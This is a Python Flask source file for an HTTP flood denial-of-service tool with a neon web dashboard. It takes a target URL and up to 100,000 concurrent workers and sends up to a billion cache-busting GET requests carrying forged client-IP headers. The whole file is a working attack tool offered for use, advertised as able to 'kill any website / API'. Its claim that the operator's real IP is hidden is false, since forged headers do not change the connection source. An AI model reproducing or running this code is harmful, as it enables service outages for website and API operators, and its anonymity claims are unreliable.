import asyncio
import aiohttp
import random
import time
import hashlib
from flask import Flask, render_template_string, request, jsonify
from flask_cors import CORS
from threading import Thread
import ssl
import socket
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)
CORS(app)

# Attack state
attack_active = False
attack_stats = {
    'total': 0,
    'success': 0,
    'failed': 0,
    'start_time': None,
    'current_rate': 0
}
target_url = ""
thread_count = 50000

# Fake IP pool (will be randomized per request)
FAKE_IP_POOL = [
    "104.16.0.1", "104.16.0.2", "104.16.0.3", "104.16.0.4", "104.16.0.5",
    "22.0.0.1", "23.0.0.1", "23.0.0.2", "23.0.0.3", "23.0.0.4",
    "54.0.0.1", "54.0.0.2", "54.0.0.3", "54.0.0.4", "54.0.0.5",
    "8.8.8.8", "1.1.1.1", "203.0.113.1", "198.51.100.1", "192.0.2.1",
    "45.33.22.11", "104.18.0.1", "172.217.0.1", "142.250.0.1", "34.120.0.1"
]

def get_random_fake_ip():
    return random.choice(FAKE_IP_POOL)

def generate_more_fake_ips():
    """Generate unlimited fake IPs"""
    ips = []
    for _ in range(100):
        ips.append(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
    return ips

EXTENDED_FAKE_IPS = generate_more_fake_ips()
ALL_FAKE_IPS = FAKE_IP_POOL + EXTENDED_FAKE_IPS

# Glowing HTML Dashboard
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 ULTRA FUNK BRONX | GLOWING DDoS DASHBOARD 🔥</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }

        body {
            background: radial-gradient(circle at 25% 40%, #0a0a0a, #000000, #1a0030);
            font-family: 'Orbitron', 'Courier New', monospace;
            min-height: 100vh;
            padding: 20px;
            animation: bgShift 4s infinite alternate;
        }

        @keyframes bgShift {
            0% { background: radial-gradient(circle at 20% 30%, #0a0a0a, #000000, #1a0030); }
            100% { background: radial-gradient(circle at 80% 70%, #1a0030, #000000, #0a0a0a); }
        }

        @keyframes ultraGlow {
            0% { text-shadow: 0 0 5px #ff00ff, 0 0 10px #ff00ff; }
            50% { text-shadow: 0 0 20px #ff00ff, 0 0 40px #00ffff, 0 0 60px #ff00ff; }
            100% { text-shadow: 0 0 5px #00ffff, 0 0 15px #00ffff; }
        }

        @keyframes borderPulse {
            0% { border-color: #ff00ff; box-shadow: 0 0 10px #ff00ff; }
            50% { border-color: #00ffff; box-shadow: 0 0 30px #00ffff; }
            100% { border-color: #ff00ff; box-shadow: 0 0 10px #ff00ff; }
        }

        .container {
            max-width: 1500px;
            margin: 0 auto;
        }

        .header {
            border: 3px solid #ff00ff;
            padding: 30px;
            text-align: center;
            border-radius: 30px;
            margin-bottom: 30px;
            background: rgba(0,0,0,0.7);
            backdrop-filter: blur(10px);
            animation: borderPulse 1.5s infinite;
        }

        .glow-title {
            font-size: 3em;
            font-weight: 900;
            animation: ultraGlow 1.2s infinite alternate;
            letter-spacing: 5px;
        }

        .subtitle {
            color: #00ffff;
            font-size: 1.2em;
            margin-top: 10px;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            border: 2px solid #ff00ff;
            padding: 20px;
            text-align: center;
            background: rgba(0,0,0,0.8);
            border-radius: 20px;
            transition: 0.3s;
            animation: borderPulse 2s infinite;
        }

        .stat-card:hover {
            transform: scale(1.05);
            background: rgba(255,0,255,0.1);
        }

        .stat-label {
            font-size: 14px;
            color: #00ffff;
            letter-spacing: 2px;
        }

        .stat-value {
            font-size: 2.8em;
            font-weight: bold;
            color: #ff3366;
            font-family: monospace;
        }

        .input-zone {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            margin-bottom: 30px;
        }

        input, select, button {
            background: #000;
            border: 2px solid #ff00ff;
            color: #00ffff;
            padding: 15px 20px;
            font-family: 'Orbitron', monospace;
            font-weight: bold;
            border-radius: 15px;
            font-size: 16px;
            transition: 0.3s;
        }

        input {
            flex: 3;
            background: #0a0a0a;
        }

        input:focus {
            outline: none;
            box-shadow: 0 0 25px #ff00ff;
            border-color: #00ffff;
        }

        button {
            cursor: pointer;
            background: linear-gradient(45deg, #ff00ff22, #00ffff22);
            flex: 1;
        }

        button:hover {
            background: linear-gradient(45deg, #ff00ff, #00ffff);
            color: #000;
            box-shadow: 0 0 30px #ff00ff;
            transform: scale(1.02);
        }

        .log-panel {
            border: 2px solid #ff00ff;
            height: 350px;
            overflow-y: auto;
            background: rgba(0,0,0,0.9);
            border-radius: 20px;
            padding: 15px;
            margin-bottom: 20px;
        }

        .log-entry {
            font-family: monospace;
            border-left: 3px solid #ff00ff;
            padding: 8px 15px;
            margin: 8px 0;
            font-size: 12px;
            animation: fadeIn 0.3s;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateX(-10px); }
            to { opacity: 1; transform: translateX(0); }
        }

        .log-attack {
            color: #ff6688;
            text-shadow: 0 0 3px #ff00ff;
        }

        .log-success {
            color: #00ffaa;
        }

        .progress-container {
            width: 100%;
            height: 35px;
            background: #1a001a;
            border: 2px solid #ff00ff;
            border-radius: 30px;
            overflow: hidden;
            margin: 20px 0;
        }

        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #ff00ff, #00ffff, #ff00ff);
            transition: width 0.05s linear;
            animation: progressShine 1s infinite;
        }

        @keyframes progressShine {
            0% { opacity: 1; }
            50% { opacity: 0.8; }
            100% { opacity: 1; }
        }

        .info-bar {
            position: fixed;
            bottom: 15px;
            right: 15px;
            background: #000;
            border: 1px solid #ff00ff;
            padding: 10px 18px;
            border-radius: 25px;
            font-size: 11px;
            color: #00ffff;
            font-weight: bold;
            z-index: 1000;
        }

        .fake-ip-display {
            position: fixed;
            bottom: 15px;
            left: 15px;
            background: #000;
            border: 1px solid #00ffff;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 10px;
            color: #ff00ff;
        }

        @media (max-width: 900px) {
            .stats-grid { grid-template-columns: repeat(3, 1fr); }
            .glow-title { font-size: 1.8em; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="glow-title">🔥 ULTRA FUNK DDOS 🔥</div>
        <div class="glow-title" style="font-size: 1.8em;">BRONX ULTRA EDITION</div>
        <div class="subtitle">💀 UNLIMITED REQUESTS | REAL IP HIDDEN | FAKE IP SPOOFED 💀</div>
        <div class="subtitle">⚡ 1000% REAL REQUEST | MULTI SESSION ⚡</div>
    </div>

    <div class="stats-grid">
        <div class="stat-card"><div class="stat-label">💥 TOTAL REQUESTS</div><div class="stat-value" id="total">0</div></div>
        <div class="stat-card"><div class="stat-label">✅ SUCCESS</div><div class="stat-value" id="success">0</div></div>
        <div class="stat-card"><div class="stat-label">❌ FAILED</div><div class="stat-value" id="failed">0</div></div>
        <div class="stat-card"><div class="stat-label">⚡ REQ/SEC</div><div class="stat-value" id="rate">0</div></div>
        <div class="stat-card"><div class="stat-label">🎭 FAKE IP MODE</div><div class="stat-value" id="fakeMode">ACTIVE</div></div>
    </div>

    <div class="input-zone">
        <input type="text" id="targetUrl" placeholder="ENTER YOUR URL: https://example.com OR https://server-op.in/api?num=1234567890" value="https://httpbin.org/get">
        <select id="threadSelect">
            <option value="10000">10K THREADS</option>
            <option value="25000">25K THREADS</option>
            <option value="50000" selected>50K THREADS (MAX)</option>
            <option value="100000">100K THREADS (ULTRA)</option>
        </select>
        <button id="startBtn">💀 START UNLIMITED ATTACK 💀</button>
        <button id="stopBtn">⛔ STOP ATTACK</button>
    </div>

    <div class="progress-container">
        <div class="progress-fill" id="progressFill"></div>
    </div>

    <div class="log-panel" id="logPanel">
        <div class="log-entry log-attack">🔥 WELCOME TO ULTRA FUNK BRONX DDOS</div>
        <div class="log-entry log-attack">🔒 YOUR REAL IP IS COMPLETELY HIDDEN</div>
        <div class="log-entry log-attack">🎭 EVERY REQUEST USES FAKE SPOOFED IP</div>
        <div class="log-entry log-attack">💀 UNLIMITED REQUESTS | MULTI SESSION ACTIVE</div>
        <div class="log-entry log-success">✅ READY TO KILL ANY WEBSITE / API</div>
    </div>
</div>
<div class="info-bar">🎭 FAKE IP SPOOFING | REAL IP HIDDEN</div>
<div class="fake-ip-display" id="fakeIpDisplay">🔄 GENERATING FAKE IP...</div>

<script>
    let statsInterval = null;
    
    async function updateStats() {
        try {
            const res = await fetch('/api/stats');
            const data = await res.json();
            document.getElementById('total').innerText = data.total.toLocaleString();
            document.getElementById('success').innerText = data.success.toLocaleString();
            document.getElementById('failed').innerText = data.failed.toLocaleString();
            document.getElementById('rate').innerText = data.rate.toLocaleString();
            let percent = Math.min(100, Math.floor((data.total / 1000000000) * 100));
            document.getElementById('progressFill').style.width = percent + '%';
            if(data.total >= 1000000000) {
                document.getElementById('progressFill').style.width = '100%';
            }
        } catch(e) {}
    }
    
    async function addLog(msg, type='attack') {
        const logDiv = document.getElementById('logPanel');
        const entry = document.createElement('div');
        entry.className = `log-entry ${type === 'attack' ? 'log-attack' : 'log-success'}`;
        entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
        logDiv.appendChild(entry);
        entry.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        while(logDiv.children.length > 300) logDiv.removeChild(logDiv.children[0]);
    }
    
    // Fake IP randomizer display
    function updateFakeIpDisplay() {
        const fakeIps = [
            '104.22.33.' + Math.floor(Math.random()*255),
            '23.45.67.' + Math.floor(Math.random()*255),
            '54.12.89.' + Math.floor(Math.random()*255),
            '192.168.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255),
            '10.0.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255)
        ];
        document.getElementById('fakeIpDisplay').innerHTML = `🎭 CURRENT SPOOF IP: ${fakeIps[Math.floor(Math.random()*fakeIps.length)]}`;
    }
    
    setInterval(updateFakeIpDisplay, 800);
    
    document.getElementById('startBtn').onclick = async () => {
        let target = document.getElementById('targetUrl').value.trim();
        const threads = parseInt(document.getElementById('threadSelect').value);
        if(!target) {
            alert('ENTER VALID URL OR API');
            return;
        }
        if(!target.startsWith('http')) target = 'https://' + target;
        
        const res = await fetch('/api/start', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ target: target, threads: threads })
        });
        const data = await res.json();
        addLog(data.message, 'attack');
        if(statsInterval) clearInterval(statsInterval);
        statsInterval = setInterval(updateStats, 300);
    };
    
    document.getElementById('stopBtn').onclick = async () => {
        const res = await fetch('/api/stop', { method: 'POST' });
        const data = await res.json();
        addLog(data.message, 'success');
        if(statsInterval) { clearInterval(statsInterval); statsInterval = null; }
    };
    
    updateStats();
    setInterval(updateStats, 1000);
    addLog('🎯 SYSTEM READY | UNLIMITED REQUESTS | MULTI SESSION', 'success');
</script>
</body>
</html>
"""

# ========== CORE ATTACK ENGINE ==========
async def send_spoofed_request(session, url, worker_id):
    """Send request with fake IP - real IP completely hidden"""
    global attack_stats
    if not attack_active:
        return
    
    # Generate random fake IP for this request
    fake_ip = random.choice(ALL_FAKE_IPS)
    
    # Random headers with fake IP everywhere
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
            'Mozilla/5.0 (Android 12; Mobile) AppleWebKit/537.36'
        ]),
        'X-Forwarded-For': fake_ip,
        'X-Real-IP': fake_ip,
        'X-Originating-IP': fake_ip,
        'X-Remote-IP': fake_ip,
        'X-Client-IP': fake_ip,
        'Forwarded': f'for={fake_ip}',
        'CF-Connecting-IP': fake_ip,
        'True-Client-IP': fake_ip,
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive'
    }
    
    # Add random cache buster
    final_url = url + (('&' if '?' in url else '?') + f'req={hash(time.time())}_{worker_id}_{random.randint(1,9999999)}')
    
    try:
        async with session.get(final_url, headers=headers, ssl=False, timeout=aiohttp.ClientTimeout(total=2)) as resp:
            attack_stats['total'] += 1
            if resp.status < 500:
                attack_stats['success'] += 1
            else:
                attack_stats['failed'] += 1
    except:
        attack_stats['total'] += 1
        attack_stats['failed'] += 1

async def worker_task(worker_id, url, requests_per_worker):
    """Worker that sends unlimited requests with fake IP"""
    connector = aiohttp.TCPConnector(limit=0, ssl=False, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        sent = 0
        while attack_active and sent < requests_per_worker:
            await send_spoofed_request(session, url, worker_id)
            sent += 1
            if sent % 500 == 0:
                await asyncio.sleep(0)

async def massive_attack(target, num_threads):
    """Launch unlimited multi-session attack"""
    global attack_active, attack_stats
    attack_active = True
    attack_stats = {
        'total': 0,
        'success': 0,
        'failed': 0,
        'start_time': time.time(),
        'current_rate': 0
    }
    
    # UNLIMITED - 1 Billion requests target
    REQUESTS_TARGET = 1000000000
    requests_per_worker = REQUESTS_TARGET // num_threads + 1
    
    tasks = []
    for i in range(num_threads):
        tasks.append(asyncio.create_task(worker_task(i, target, requests_per_worker)))
    
    await asyncio.gather(*tasks)
    attack_active = False

def run_attack(target, threads):
    asyncio.run(massive_attack(target, threads))

# Flask Routes
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/stats')
def get_stats():
    global attack_stats, attack_active
    rate = 0
    if attack_stats['start_time'] and attack_active:
        elapsed = time.time() - attack_stats['start_time']
        if elapsed > 0:
            rate = int(attack_stats['total'] / elapsed)
    return jsonify({
        'total': attack_stats['total'],
        'success': attack_stats['success'],
        'failed': attack_stats['failed'],
        'rate': rate,
        'active': attack_active
    })

@app.route('/api/start', methods=['POST'])
def start_attack():
    global target_url, thread_count, attack_active, attack_thread
    if attack_active:
        return jsonify({'message': '⚠️ ATTACK ALREADY RUNNING! STOP FIRST'})
    
    data = request.json
    target_url = data.get('target', '').strip()
    thread_count = data.get('threads', 50000)
    
    if not target_url:
        return jsonify({'message': '❌ NO TARGET PROVIDED'})
    
    attack_thread = Thread(target=run_attack, args=(target_url, thread_count))
    attack_thread.daemon = True
    attack_thread.start()
    
    return jsonify({'message': f'💀 ATTACK STARTED ON {target_url} | {thread_count} THREADS | UNLIMITED REQUESTS | FAKE IP SPOOFING ACTIVE 💀'})

@app.route('/api/stop', methods=['POST'])
def stop_attack():
    global attack_active
    attack_active = False
    return jsonify({'message': '⛔ ATTACK STOPPED | ALL SESSIONS CLOSED ⛔'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
